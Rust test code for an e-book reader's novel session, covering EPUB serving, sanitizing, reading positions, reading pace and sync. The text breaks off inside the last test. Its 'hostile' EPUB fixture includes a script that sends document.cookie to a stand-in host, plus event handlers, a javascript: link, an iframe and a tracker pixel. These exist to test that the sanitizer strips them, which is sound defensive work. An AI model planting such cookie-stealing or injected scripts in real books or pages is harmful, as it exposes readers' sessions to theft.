//! Novels through the session: EPUBs and sources' text chapters served to the web view, the
//! paginator's reports, and the place kept as a text position.

use std::io::Cursor;

use async_trait::async_trait;
use kaeri_books::write::{BookMeta, EpubFlavor, EpubWriter};
use kaeri_core::{
    books::{
        BookHints, BookSourceKind, BookSourceManifest, ChapterContent, SeriesDetail, SeriesHit,
        SourceChapter,
    },
    error::ProviderError,
};
use kaeri_model::reader::{BookBody, BookResource, NovelOpenView, NovelPos};

use super::*;

/// A two-document novel, with a stylesheet, a font and a picture.
fn epub(path: &Path, title: &str) {
    let mut w = EpubWriter::new(
        Cursor::new(Vec::new()),
        BookMeta { title: title.into(), language: "en".into(), ..BookMeta::default() },
        EpubFlavor::Epub,
        None,
    )
    .unwrap();
    let picture = image::GrayImage::from_pixel(40, 60, image::Luma([90]));
    let mut png = Vec::new();
    picture.write_to(&mut Cursor::new(&mut png), image::ImageFormat::Png).unwrap();
    w.add_resource("images/lamp.png", "image/png", &png).unwrap();
    w.add_resource("style.css", "text/css", b"p { text-indent: 1em }").unwrap();
    w.add_resource("fonts/lantern.woff2", "font/woff2", b"wOF2 a made-up font").unwrap();
    w.add_chapter("One", "<h1>One</h1><p>The lantern keeper climbed the stair.</p><img src=\"images/lamp.png\" alt=\"\"/>").unwrap();
    w.add_chapter("Two", "<h1>Two</h1><p>The tide came in under the pier.</p>").unwrap();
    std::fs::write(path, w.finish().unwrap().into_inner()).unwrap();
}

/// An EPUB a hostile packager made by hand: a script in the manifest, handlers, a remote
/// picture, a refresh to elsewhere.
fn hostile(path: &Path) {
    let file = std::fs::File::create(path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let o = zip::write::SimpleFileOptions::default();
    let mut put = |name: &str, text: &str| {
        zip.start_file(name, o).unwrap();
        zip.write_all(text.as_bytes()).unwrap();
    };
    put("mimetype", "application/epub+zip");
    put(
        "META-INF/container.xml",
        r#"<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OPS/book.opf" media-type="application/oebps-package+xml"/></rootfiles></container>"#,
    );
    put(
        "OPS/book.opf",
        r#"<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:uuid:00000000-0000-4000-8000-000000000001</dc:identifier><dc:title>The Quiet Harbour</dc:title><dc:language>en</dc:language></metadata><manifest><item id="t" href="text.xhtml" media-type="application/xhtml+xml"/><item id="s" href="run.js" media-type="application/javascript"/></manifest><spine><itemref idref="t"/></spine></package>"#,
    );
    put(
        "OPS/text.xhtml",
        r#"<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="refresh" content="0;url=https://elsewhere.example/"/><script src="run.js"></script><base href="https://elsewhere.example/"/></head><body onload="steal()"><p onclick="steal()">Harbour lights.</p><img src="https://tracker.example/pixel.png"/><a href="javascript:steal()">Go</a><iframe src="https://elsewhere.example/"></iframe></body></html>"#,
    );
    put("OPS/run.js", "fetch('https://elsewhere.example/'+document.cookie)");
    zip.finish().unwrap();
}

/// An EPUB of two documents in the reading flow with a note between them outside it, its markup
/// written out so places in it can be worked out by hand.
fn two_documents(path: &Path) {
    let file = std::fs::File::create(path).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let o = zip::write::SimpleFileOptions::default();
    let mut put = |name: &str, text: &str| {
        zip.start_file(name, o).unwrap();
        zip.write_all(text.as_bytes()).unwrap();
    };
    put("mimetype", "application/epub+zip");
    put(
        "META-INF/container.xml",
        r#"<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OPS/book.opf" media-type="application/oebps-package+xml"/></rootfiles></container>"#,
    );
    put(
        "OPS/book.opf",
        r#"<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:uuid:00000000-0000-4000-8000-000000000002</dc:identifier><dc:title>The Lantern Keeper</dc:title><dc:language>en</dc:language></metadata><manifest><item id="one" href="one.xhtml" media-type="application/xhtml+xml"/><item id="note" href="note.xhtml" media-type="application/xhtml+xml"/><item id="two" href="two.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="one"/><itemref idref="note" linear="no"/><itemref idref="two"/></spine></package>"#,
    );
    let page = |title: &str, body: &str| {
        format!(
            r#"<?xml version="1.0" encoding="utf-8"?><html xmlns="http://www.w3.org/1999/xhtml"><head><title>{title}</title></head><body>{body}</body></html>"#
        )
    };
    put(
        "OPS/one.xhtml",
        &page(
            "One",
            "<h1>One</h1><p>The keeper <em>climbed</em> the stair.</p><p>Night fell.</p>",
        ),
    );
    put("OPS/note.xhtml", &page("Note", "<p>A note on lanterns.</p>"));
    put("OPS/two.xhtml", &page("Two", "<h1>Two</h1><p>The tide came in.</p>"));
    zip.finish().unwrap();
}

/// A surface with no web view, as the terminal's.
fn text_surface() -> ReaderSurface {
    ReaderSurface { text: true, ..surface() }
}

/// The words of a document's blocks, one line a block.
fn read_out(doc: &kaeri_model::reader::NovelTextDoc) -> Vec<String> {
    doc.blocks.iter().map(|b| b.runs.iter().map(|r| r.text.as_str()).collect()).collect()
}

fn shelf_file(path: &Path, n: i64, format: &str) -> ShelfFile {
    ShelfFile {
        path: path.display().to_string(),
        chapter: None,
        label: format!("Chapter {n}"),
        volume: None,
        number_milli: Some(n * 1000),
        format: format.into(),
        pages: None,
        comicinfo: None,
        source: None,
    }
}

/// A novel work of two EPUB volumes.
fn novel_harness() -> Harness {
    novel_harness_in(Store::open_in_memory().unwrap())
}

/// As [`novel_harness`], over `store`.
fn novel_harness_in(store: Store) -> Harness {
    harness_of(store, "novel", |books| {
        (1..=2)
            .map(|n| {
                let path = books.join(format!("Volume {n}.epub"));
                epub(&path, &format!("The Lantern Keeper {n}"));
                shelf_file(&path, n, "epub")
            })
            .collect()
    })
}

impl Harness {
    async fn open_novel(&mut self, at: OpenAt) -> (ReaderView, NovelOpenView) {
        self.open_novel_on(at, surface()).await
    }

    async fn open_novel_on(
        &mut self,
        at: OpenAt,
        surface: ReaderSurface,
    ) -> (ReaderView, NovelOpenView) {
        let work = WorkId::new(WORK);
        self.send(ReaderCommand::Open { work, chapter: None, at, surface });
        let view = self
            .until(|e| match e {
                ReaderEvent::Opened(view) => Some(view.as_ref().clone()),
                _ => None,
            })
            .await;
        let novel = self
            .until(|e| match e {
                ReaderEvent::NovelOpen(view) => Some(view.clone()),
                _ => None,
            })
            .await;
        (view, novel)
    }

    fn at(&mut self, pos: NovelPos, page: u32, pages: u32, how: TurnHow) {
        let session = self.session();
        let chapter = self.reader.session.as_ref().unwrap().chapter().id.clone();
        self.send(ReaderCommand::NovelAt { session, chapter, pos, page, pages, how });
    }

    fn get(&self, url: &str) -> BookResource {
        self.services.novels.resource(url).expect("a book's address")
    }
}

fn text(r: &BookResource) -> String {
    match &r.body {
        BookBody::Bytes { data } => String::from_utf8(data.clone()).unwrap(),
        BookBody::File { path } => std::fs::read_to_string(path).unwrap(),
    }
}

fn pos(spine: u32, path: &[u32], offset: u32) -> NovelPos {
    NovelPos { spine, path: path.to_vec(), offset }
}

#[tokio::test(start_paused = true)]
async fn an_epub_opens_in_the_web_view_with_its_files_served_cleaned() {
    let mut h = novel_harness();
    let (view, novel) = h.open_novel(OpenAt::Resume).await;
    assert_eq!(view.medium, Medium::Novel);
    assert_eq!(view.chapter.id.as_str(), "1");
    assert_eq!(novel.spine.len(), 2, "the two chapters");
    assert!(novel.spine.iter().all(|s| s.linear));
    assert!(novel.entry.starts_with("kaeri-book://"), "{}", novel.entry);
    assert_eq!(novel.restore, None);
    assert_eq!(novel.toc.iter().map(|t| t.label.as_str()).collect::<Vec<_>>(), ["One", "Two"]);
    let style: serde_json::Value = serde_json::from_str(&novel.style).unwrap();
    assert_eq!(style["look"]["name"], "light");
    assert_eq!(style["mode"], "paged");
    assert!(!novel.count_key.is_empty() && novel.counted.is_empty());

    // The first chapter's document: cleaned, with its setup, under the policy.
    let first = &novel.toc[0].url;
    let doc = h.get(first);
    assert_eq!((doc.status, doc.mime.as_str()), (200, "application/xhtml+xml"));
    let csp = doc.headers.iter().find(|h| h.name == "Content-Security-Policy").unwrap();
    assert!(csp.value.contains("script-src 'none'"));
    let body = text(&doc);
    assert!(body.contains("name=\"kaeri-setup\"") && body.contains("lantern keeper"), "{body}");

    // Its picture, as a file; its stylesheet, cleaned.
    let base = first.rsplit_once('/').unwrap().0;
    let picture = h.get(&format!("{base}/images/lamp.png"));
    assert_eq!((picture.status, picture.mime.as_str()), (200, "image/png"));
    let BookBody::File { path } = &picture.body else { panic!("a file") };
    assert!(Path::new(path).exists());
    assert_eq!(h.get(&format!("{base}/style.css")).mime, "text/css");
    assert_eq!(h.get(&format!("{base}/nothing.css")).status, 404);

    // A document is never kept by the web view, as its settings change; the book's other
    // files are, and a font is read out of the book once, into a file, for every document.
    let cache = |r: &BookResource| {
        r.headers.iter().find(|h| h.name == "Cache-Control").map(|h| h.value.clone()).unwrap()
    };
    assert_eq!(cache(&doc), "no-store");
    assert!(cache(&picture).contains("max-age"), "{}", cache(&picture));
    let sheet = h.get(&format!("{base}/style.css"));
    assert!(cache(&sheet).contains("max-age"), "{}", cache(&sheet));
    assert_eq!(text(&sheet), text(&h.get(&format!("{base}/style.css"))));
    let font = h.get(&format!("{base}/fonts/lantern.woff2"));
    assert_eq!((font.status, font.mime.as_str()), (200, "font/woff2"));
    assert!(cache(&font).contains("immutable"), "{}", cache(&font));
    let BookBody::File { path: font_file } = &font.body else { panic!("a file") };
    assert_eq!(std::fs::read(font_file).unwrap(), b"wOF2 a made-up font");
    let again = h.get(&format!("{base}/fonts/lantern.woff2"));
    assert!(matches!(&again.body, BookBody::File { path } if path == font_file));

    // Closed, nothing is served and the files are gone.
    let session = h.session();
    h.send(ReaderCommand::Close { session });
    assert_eq!(h.get(first).status, 404);
    assert!(!Path::new(path).exists());
    assert!(!Path::new(font_file).exists());
}

#[tokio::test(start_paused = true)]
async fn a_hostile_book_reads_with_nothing_active_and_nothing_remote() {
    let mut h = harness_of(Store::open_in_memory().unwrap(), "novel", |books| {
        let path = books.join("Volume 1.epub");
        hostile(&path);
        vec![shelf_file(&path, 1, "epub")]
    });
    let (_, novel) = h.open_novel(OpenAt::Start).await;
    let doc = h.get(&novel.entry);
    assert_eq!(doc.status, 200);
    let body = text(&doc);
    let plain = body.replace('\u{AD}', "");
    assert!(plain.contains("Harbour lights."), "{body}");
    for gone in [
        "<script",
        "onload",
        "onclick",
        "javascript:",
        "<iframe",
        "<base",
        "refresh",
        "tracker.example",
    ] {
        assert!(!body.contains(gone), "{gone} in {body}");
    }
    let script = novel.entry.replace("text.xhtml", "run.js");
    assert_eq!(h.get(&script).status, 403, "scripts are never served");
}

#[tokio::test(start_paused = true)]
async fn back_to_page_in_a_novel_follows_only_a_jump_of_more_than_two_screens() {
    let mut h = novel_harness();
    let (_, novel) = h.open_novel(OpenAt::Resume).await;
    let first = novel.spine.iter().position(|s| s.linear).unwrap() as u32;
    // The first layout and a new one after a font change are the app's own moves.
    h.at(pos(first, &[1], 0), 0, 8, TurnHow::Placed);
    h.at(pos(first, &[2], 0), 2, 8, TurnHow::Jump);
    assert_eq!(offers(&h.drain()), [], "two screens on");
    h.at(pos(first, &[2], 0), 5, 16, TurnHow::Placed);
    assert_eq!(offers(&h.drain()), [], "laid out again");
    h.at(pos(first, &[6], 0), 12, 16, TurnHow::Jump);
    assert_eq!(offers(&h.drain()), [Some(6)]);
    h.at(pos(first, &[6], 40), 13, 16, TurnHow::Swipe);
    assert_eq!(offers(&h.drain()), [None]);
}

/// A private read holds a novel's text position in memory and stores nothing: the next open
/// resumes there, as an open after a stored read does.
#[tokio::test(start_paused = true)]
async fn a_private_novel_opens_again_at_the_place_held_in_memory() {
    let mut h = novel_harness();
    h.services.privacy.set(true);
    let (_, novel) = h.open_novel(OpenAt::Resume).await;
    let first = novel.spine.iter().position(|s| s.linear).unwrap() as u32;
    h.at(pos(first, &[3], 12), 2, 4, TurnHow::Turn);
    let session = h.session();
    h.send(ReaderCommand::Close { session });
    let (_, again) = h.open_novel(OpenAt::Resume).await;
    assert!(h.kept("1").is_none());
    assert_eq!(again.restore, Some(pos(first, &[3], 12)));
    assert!(again.entry.ends_with(&format!("#kaeri:pos={first}/3/12")), "{}", again.entry);
}

#[tokio::test(start_paused = true)]
async fn novel_places_are_text_positions_that_resume_with_back_to_page() {
    let mut h = novel_harness();
    let (_, novel) = h.open_novel(OpenAt::Resume).await;
    let first = novel.spine.iter().position(|s| s.linear).unwrap() as u32;
    h.at(pos(first, &[1], 0), 0, 4, TurnHow::Turn);
    let kept = h.kept("1").unwrap();
    assert_eq!(kept.novel_pos.as_deref(), Some(format!("{first}/1/0").as_str()));

    // A jump offers the place it left.
    tokio::time::advance(WRITE_EVERY).await;
    h.at(pos(first, &[3], 12), 3, 6, TurnHow::Jump);
    assert_eq!(offers(&h.drain()), [Some(1)]);
    h.send(ReaderCommand::BackTo { session: h.session() });
    let back = h
        .until(|e| match e {
            ReaderEvent::GoTo { place, .. } => Some(place.clone()),
            _ => None,
        })
        .await;
    assert_eq!(back.novel, Some(pos(first, &[1], 0)));

    // Closed and opened again: the place comes back, in the address and the view, and the
    // notice waits for the first page.
    h.at(pos(first, &[3], 12), 2, 4, TurnHow::Turn);
    let session = h.session();
    h.send(ReaderCommand::Close { session });
    let (_, again) = h.open_novel(OpenAt::Resume).await;
    assert_eq!(again.restore, Some(pos(first, &[3], 12)));
    assert!(again.entry.ends_with(&format!("#kaeri:pos={first}/3/12")), "{}", again.entry);
    assert!(notices(&h.drain()).is_empty());
    h.at(pos(first, &[3], 12), 2, 4, TurnHow::Turn);
    assert_eq!(notices(&h.drain()), [ReadingMsg::ReaderResumed { page: 3 }]);

    // Start over goes to the top of the flow.
    h.send(ReaderCommand::StartOver { session: h.session() });
    let start = h
        .until(|e| match e {
            ReaderEvent::GoTo { place, .. } => Some(place.clone()),
            _ => None,
        })
        .await;
    assert_eq!(start.novel, Some(pos(first, &[], 0)));

    // Kept at the first page, it opens there with nothing to start over from.
    h.at(pos(first, &[], 0), 0, 4, TurnHow::Turn);
    tokio::time::advance(WRITE_EVERY).await;
    let session = h.session();
    h.send(ReaderCommand::Close { session });
    h.drain();
    h.open_novel(OpenAt::Resume).await;
    h.at(pos(first, &[], 0), 0, 4, TurnHow::Turn);
    assert!(notices(&h.drain()).is_empty(), "no Resumed at page 1");
}

/// Another device's place in a later volume opens that volume at its text position, and the move
/// is said at the page it lands on here: page numbers differ between screens.
#[tokio::test(start_paused = true)]
async fn another_devices_place_in_a_later_volume_is_said_at_the_page_it_lands_on() {
    let mine = Store::open_in_memory().unwrap();
    mine.sync_enable("phone").unwrap();
    let desk = Store::open_in_memory().unwrap();
    desk.set_sync_clock(|| 4_000_000_000_000);
    desk.sync_enable("desk").unwrap();
    mine.sync_device_add("desk", "Desk", "").unwrap();
    let mut h = novel_harness_in(mine.clone());
    let (_, novel) = h.open_novel(OpenAt::Start).await;
    let first = novel.spine.iter().position(|s| s.linear).unwrap() as u32;
    let mut there = ReadEvent::new(WORK, "2", 2);
    there.page = Some(5);
    there.novel_pos = Some(pos(first, &[3], 12).encode());
    desk.record_read(&there, Vec::new()).unwrap();
    let ops = desk.ops_after(&mine.version_vector().unwrap(), usize::MAX).unwrap();
    mine.apply_ops(ops).unwrap();
    h.synced();
    let opened = h
        .until(|e| match e {
            ReaderEvent::NovelOpen(view) => Some(view.clone()),
            _ => None,
        })
        .await;
    assert_eq!((opened.chapter.as_str(), opened.restore), ("2", Some(pos(first, &[3], 12))));
    h.at(pos(first, &[3], 12), 2, 4, TurnHow::Placed);
    let moved =
        ReadingMsg::ReaderMovedNumber { chapter: "2".into(), page: 3, device: "Desk".into() };
    assert_eq!(notices(&h.drain()), [moved]);
}

#[tokio::test(start_paused = true)]
async fn each_document_says_its_words_and_page_turns_teach_the_pace() {
    let mut h = novel_harness();
    let (_, novel) = h.open_novel(OpenAt::Resume).await;
    let first = novel.spine.iter().position(|s| s.linear).unwrap();
    // "One. The lantern keeper climbed the stair."
    assert_eq!(novel.spine[first].words, 7);
    assert_eq!(novel.words_per_minute, crate::reading::session::novel::DEFAULT_PACE);
    let spine = first as u32;

    // A page read in an instant, or after a long pause, teaches nothing.
    h.at(pos(spine, &[1], 0), 0, 2, TurnHow::Turn);
    tokio::time::advance(Duration::from_secs(1)).await;
    h.at(pos(spine, &[2], 0), 1, 2, TurnHow::Turn);
    let session = h.session();
    h.send(ReaderCommand::Close { session });
    let (_, again) = h.open_novel(OpenAt::Resume).await;
    assert_eq!(again.words_per_minute, 230);

    // Three words in 6 s is a slow page: the pace eases down, not all the way.
    h.at(pos(spine, &[1], 0), 0, 2, TurnHow::Turn);
    tokio::time::advance(Duration::from_secs(6)).await;
    h.at(pos(spine, &[2], 0), 1, 2, TurnHow::Turn);
    let session = h.session();
    h.send(ReaderCommand::Close { session });
    let (_, slower) = h.open_novel(OpenAt::Resume).await;
    assert_eq!(slower.words_per_minute, 203, "230 eased a little toward a slow page");
}

#[test]
fn the_pace_moves_slowly_and_only_for_pages_read_at_a_reading_speed() {
    use crate::reading::session::novel::learnt;
    assert_eq!(learnt(230, 0, Duration::from_secs(30)), None, "no words, nothing learnt");
    assert_eq!(learnt(230, 150, Duration::from_secs(2)), None, "a skim");
    assert_eq!(learnt(230, 150, Duration::from_secs(900)), None, "a pause");
    // 150 words in 30 s is 300 a minute: the pace moves 15% of the way.
    assert_eq!(learnt(230, 150, Duration::from_secs(30)), Some(241));
}

#[tokio::test(start_paused = true)]
async fn the_last_page_of_the_last_document_reads_after_it_holds_and_the_end_page_at_once() {
    let mut h = novel_harness();
    let (_, novel) = h.open_novel(OpenAt::Resume).await;
    let last = novel.spine.iter().rposition(|s| s.linear).unwrap() as u32;
    // The end page is said as the book opens, so it is there before its last page shows.
    h.until(|e| matches!(e, ReaderEvent::EndPage { .. }).then_some(())).await;
    // The last page of an earlier document is not the end.
    h.at(pos(0, &[0], 0), 2, 3, TurnHow::Turn);
    tokio::time::advance(READ_AFTER * 2).await;
    assert!(!h.drain().iter().any(|e| matches!(e, ReaderEvent::ChapterRead { .. })));

    h.at(pos(last, &[2], 0), 1, 2, TurnHow::Turn);
    let before = Instant::now();
    h.until(|e| matches!(e, ReaderEvent::ChapterRead { .. }).then_some(())).await;
    assert!(before.elapsed() >= READ_AFTER - Duration::from_millis(10));
    assert!(h.kept("1").unwrap().read);

    // The next volume: its end page reads it at once.
    h.send(ReaderCommand::OpenChapter { session: h.session(), chapter: ChapterId::new("2") });
    h.until(|e| matches!(e, ReaderEvent::NovelOpen(_)).then_some(())).await;
    h.at(pos(last, &[2], 0), 2, 2, TurnHow::Swipe);
    let read = h
        .until(|e| match e {
            ReaderEvent::ChapterRead { chapter, .. } => Some(chapter.clone()),
            _ => None,
        })
        .await;
    assert_eq!(read.as_str(), "2");
}

#[tokio::test(start_paused = true)]
async fn a_setting_restyles_the_open_book_and_counts_are_kept_per_key() {
    let mut h = novel_harness();
    let (_, novel) = h.open_novel(OpenAt::Resume).await;
    let session = h.session();
    let pages = vec![1; novel.spine.len()];
    let mut counted = pages.clone();
    counted[0] = 5;
    h.send(ReaderCommand::NovelCounted {
        session,
        key: novel.count_key.clone(),
        chapter_pages: counted.clone(),
    });
    // A count under another key is not this layout's.
    h.send(ReaderCommand::NovelCounted { session, key: "old".into(), chapter_pages: pages });

    h.send(ReaderCommand::SetSetting {
        session: Some(session),
        medium: Medium::Novel,
        work: None,
        key: Key::Look,
        scope: kaeri_model::reader::SettingScope::Medium,
        value: kaeri_model::reader::ReaderValue::Choice { name: "dark".into() },
    });
    let (style, key) = h
        .until(|e| match e {
            ReaderEvent::NovelStyle { style, count_key, .. } => {
                Some((style.clone(), count_key.clone()))
            }
            _ => None,
        })
        .await;
    let style: serde_json::Value = serde_json::from_str(&style).unwrap();
    assert_eq!(
        (style["look"]["name"].as_str(), style["look"]["ink"].as_bool()),
        (Some("dark"), Some(true))
    );
    assert_ne!(key, novel.count_key, "the count key follows the settings");
    // What is served now carries the new look.
    let doc = text(&h.get(&novel.toc[0].url));
    assert!(doc.contains("#161A2E"), "{doc}");

    // Back to the first look, the first counts come back with the book.
    h.send(ReaderCommand::SetSetting {
        session: Some(session),
        medium: Medium::Novel,
        work: None,
        key: Key::Look,
        scope: kaeri_model::reader::SettingScope::Medium,
        value: kaeri_model::reader::ReaderValue::Choice { name: "light".into() },
    });
    h.send(ReaderCommand::Close { session });
    let (_, again) = h.open_novel(OpenAt::Resume).await;
    assert_eq!(again.count_key, novel.count_key);
    assert_eq!(again.counted, counted);
}

#[tokio::test(start_paused = true)]
async fn the_terminals_text_width_is_kept_without_restyling_the_book() {
    use kaeri_model::reader::{ReaderValue, SettingScope};
    let mut h = novel_harness();
    h.config.set_terminal(true);
    h.open_novel(OpenAt::Resume).await;
    let session = h.session();
    h.drain();
    let width = ReaderValue::Amount { value: 80.0 };
    h.send(ReaderCommand::SetSetting {
        session: Some(session),
        medium: Medium::Novel,
        work: None,
        key: Key::TextWidth,
        scope: SettingScope::Device,
        value: width.clone(),
    });
    let row = h
        .until(|e| match e {
            ReaderEvent::Settings(view) => {
                view.rows.iter().find(|r| r.key == Key::TextWidth).cloned()
            }
            _ => None,
        })
        .await;
    assert_eq!((row.value, row.scope), (width, SettingScope::Device));
    let events = h.drain();
    assert!(
        !events.iter().any(|e| matches!(e, ReaderEvent::NovelStyle { .. })),
        "the web view's style does not read the text width: {events:?}"
    );
}

#[tokio::test(start_paused = true)]
async fn an_epub_of_pictures_reads_as_pages() {
    let mut h = harness_of(Store::open_in_memory().unwrap(), "manga", |books| {
        let path = books.join("Volume 1.epub");
        let mut w = EpubWriter::new(
            Cursor::new(Vec::new()),
            BookMeta { title: "Harbour Sketches".into(), ..BookMeta::default() },
            EpubFlavor::Epub,
            Some(kaeri_books::write::FixedLayout { width: 300, height: 450, spreads: false }),
        )
        .unwrap();
        for i in 0..3u8 {
            let page = image::GrayImage::from_pixel(300, 450, image::Luma([40 + i * 20]));
            let mut png = Vec::new();
            page.write_to(&mut Cursor::new(&mut png), image::ImageFormat::Png).unwrap();
            w.add_image_page(&png, None, None).unwrap();
        }
        std::fs::write(&path, w.finish().unwrap().into_inner()).unwrap();
        vec![shelf_file(&path, 1, "epub")]
    });
    let (_, leaves, _) = h.open(OpenAt::Start).await;
    assert_eq!(leaves.len(), 4, "three pages and the end page");
}

/// A source whose chapters are text. It tells `reports` what it is told was read, and with a
/// gate, chapter `c1` waits for it to open.
struct TextSource {
    manifest: BookSourceManifest,
    reports: Option<tokio::sync::mpsc::UnboundedSender<(String, String, bool)>>,
    gate: Option<Arc<tokio::sync::Notify>>,
    /// Its chapters' text panics on the way, as a broken source's might.
    panics: std::sync::atomic::AtomicBool,
}

impl TextSource {
    fn new(
        reports: Option<tokio::sync::mpsc::UnboundedSender<(String, String, bool)>>,
        gate: Option<Arc<tokio::sync::Notify>>,
    ) -> Arc<Self> {
        Arc::new(Self {
            manifest: BookSourceManifest {
                id: "texts".into(),
                name: "Texts".into(),
                version: "1".into(),
                kind: BookSourceKind::Plugin,
                media: vec![Medium::Novel],
                languages: vec!["en".into()],
                allowed_hosts: Vec::new(),
                capabilities: Vec::new(),
            },
            reports,
            gate,
            panics: std::sync::atomic::AtomicBool::new(false),
        })
    }
}

#[async_trait]
impl kaeri_core::traits::BookSource for TextSource {
    fn manifest(&self) -> &BookSourceManifest {
        &self.manifest
    }

    async fn search(&self, _: &str, _: &BookHints) -> Result<Vec<SeriesHit>, ProviderError> {
        Ok(Vec::new())
    }

    async fn series(&self, id: &str, _: &BookHints) -> Result<SeriesDetail, ProviderError> {
        Ok(SeriesDetail::new(id, id))
    }

    async fn chapters(
        &self,
        _: &str,
        _: &BookHints,
    ) -> Result<Vec<SourceChapter>, ProviderError> {
        let mut first = SourceChapter::new("c1", "1");
        first.title = Some("The Pier — 1".into());
        Ok(vec![first, SourceChapter::new("c2", "2")])
    }

    async fn content(&self, _: &str, chapter: &str) -> Result<ChapterContent, ProviderError> {
        if let Some(gate) = self.gate.as_ref().filter(|_| chapter == "c1") {
            gate.notified().await;
        }
        if self.panics.load(std::sync::atomic::Ordering::SeqCst) {
            let line = std::hint::black_box("&gt;&gt;\u{2014}\u{2014}");
            let _ = &line[..10];
        }
        // The title twice, as a plugin's heading and then the page's own, with the number again.
        let n = chapter.trim_start_matches('c');
        Ok(ChapterContent::Text(format!(
            "<div><h2>Chapter {n}: The Pier — {n}</h2> <h4>Chapter {n}: The Pier — {n}</h4><p>Chapter {chapter} begins at the pier.</p><script>steal()</script><img src=\"https://tracker.example/p.png\"/></div>"
        )))
    }

    async fn report_progress(
        &self,
        series: &str,
        chapter: &str,
        read: bool,
    ) -> Result<(), ProviderError> {
        if let Some(reports) = &self.reports {
            let _ = reports.send((series.to_owned(), chapter.to_owned(), read));
        }
        Ok(())
    }
}

#[tokio::test(start_paused = true)]
async fn a_sources_text_chapter_is_served_like_a_book() {
    let mut h = harness_of(Store::open_in_memory().unwrap(), "novel", |_| Vec::new());
    h.services.book_sources.registry.put(TextSource::new(None, None));
    h.services.store.set_book_match("texts", "series-1", WORK, 90, true, false, 1).unwrap();
    let (view, novel) = h.open_novel(OpenAt::Start).await;
    assert_eq!(view.next.as_ref().map(|c| c.label.as_str()), Some("2"));
    assert_eq!(novel.spine.len(), 1);
    let doc = text(&h.get(&novel.entry));
    assert!(doc.contains("Chapter c1 begins at the pier."), "{doc}");
    assert!(!doc.contains("<script") && !doc.contains("tracker.example"), "{doc}");
    // Kaeri's stylesheet comes with the paginator, as a book's documents get it: none is linked.
    assert!(!doc.contains("<link"), "{doc}");
    // Its title once, as the chapter list says it: the page's own heading stays, hidden, so the
    // places in it stay where they were.
    assert!(doc.contains("<h2>The Pier</h2>"), "{doc}");
    assert!(doc.contains("<h4 hidden=\"hidden\">Chapter 1: The Pier — 1</h4>"), "{doc}");
    assert!(doc.contains("<title>The Pier</title>"), "{doc}");

    // Its place is kept like a book's.
    h.at(pos(0, &[0], 4), 0, 1, TurnHow::Turn);
    let chapter = view.chapter.id.as_str().to_owned();
    assert_eq!(h.kept(&chapter).and_then(|c| c.novel_pos).as_deref(), Some("0/0/4"));
}

#[tokio::test(start_paused = true)]
async fn a_text_chapter_comes_as_blocks_to_a_front_end_without_a_web_view() {
    use kaeri_model::reader::{TextBlockKind, novel_text_place};
    let mut h = harness_of(Store::open_in_memory().unwrap(), "novel", |_| Vec::new());
    h.services.book_sources.registry.put(TextSource::new(None, None));
    h.services.store.set_book_match("texts", "series-1", WORK, 90, true, false, 1).unwrap();
    let (view, novel) = h.open_novel_on(OpenAt::Start, text_surface()).await;
    assert_eq!(novel.text.len(), 1);
    let doc = &novel.text[0];
    assert_eq!(doc.spine, 0);
    // The title once, the hidden second heading and the script left out, the words in order.
    assert_eq!(read_out(doc), ["The Pier", "Chapter c1 begins at the pier."], "{doc:?}");
    assert_eq!(doc.blocks[0].kind, TextBlockKind::Heading { level: 2 });
    assert_eq!(doc.blocks[1].kind, TextBlockKind::Paragraph);
    // Each block names its own place: the place resolves to the block's start.
    for (i, block) in doc.blocks.iter().enumerate() {
        assert_eq!(block.at.spine, 0);
        assert_eq!(novel_text_place(&novel.text, &block.at), Some((0, i, 0)), "{block:?}");
    }
    // The front end reports where it is as the web view does.
    let paragraph = doc.blocks[1].at.clone();
    h.at(NovelPos { offset: paragraph.offset + 8, ..paragraph.clone() }, 0, 1, TurnHow::Turn);
    let chapter = view.chapter.id.as_str().to_owned();
    let kept = h.kept(&chapter).and_then(|c| c.novel_pos).unwrap();
    assert_eq!(
        NovelPos::decode(&kept),
        Some(NovelPos { offset: paragraph.offset + 8, ..paragraph })
    );
}

#[tokio::test(start_paused = true)]
async fn a_text_chapter_in_a_web_view_carries_no_blocks() {
    let mut h = harness_of(Store::open_in_memory().unwrap(), "novel", |_| Vec::new());
    h.services.book_sources.registry.put(TextSource::new(None, None));
    h.services.store.set_book_match("texts", "series-1", WORK, 90, true, false, 1).unwrap();
    let (_, novel) = h.open_novel(OpenAt::Start).await;
    assert!(novel.text.is_empty());
}

#[tokio::test(start_paused = true)]
async fn an_epub_comes_as_one_text_doc_for_each_document_in_the_reading_flow() {
    use kaeri_model::reader::novel_text_place;
    let mut h = harness_of(Store::open_in_memory().unwrap(), "novel", |books| {
        let path = books.join("Volume 1.epub");
        two_documents(&path);
        vec![shelf_file(&path, 1, "epub")]
    });
    let (_, novel) = h.open_novel_on(OpenAt::Start, text_surface()).await;
    // The note outside the reading flow is left out.
    let spines: Vec<u32> = novel.text.iter().map(|d| d.spine).collect();
    assert_eq!(spines, [0, 2]);
    assert_eq!(
        read_out(&novel.text[0]),
        ["One", "The keeper climbed the stair.", "Night fell."]
    );
    assert_eq!(read_out(&novel.text[1]), ["Two", "The tide came in."]);

    // The places are worked out by hand from the document as it is served: the paginator counts
    // element children from the body and a text node's offset in its own element.
    let served = text(&h.get(&novel.spine[0].url));
    assert!(
        served.contains("<body><h1>One</h1><p>The keeper <em>climbed</em> the stair.</p>"),
        "{served}"
    );
    // "clim|bed": the paragraph's own text, after "The keeper " and four letters.
    assert_eq!(novel_text_place(&novel.text, &pos(0, &[1], 15)), Some((0, 1, 15)));
    // The same place said inside the emphasis: two letters into "climbed".
    assert_eq!(novel_text_place(&novel.text, &pos(0, &[1, 0], 2)), Some((0, 1, 13)));
    // "Night |fell." in the third block, and "The |tide" in the second document.
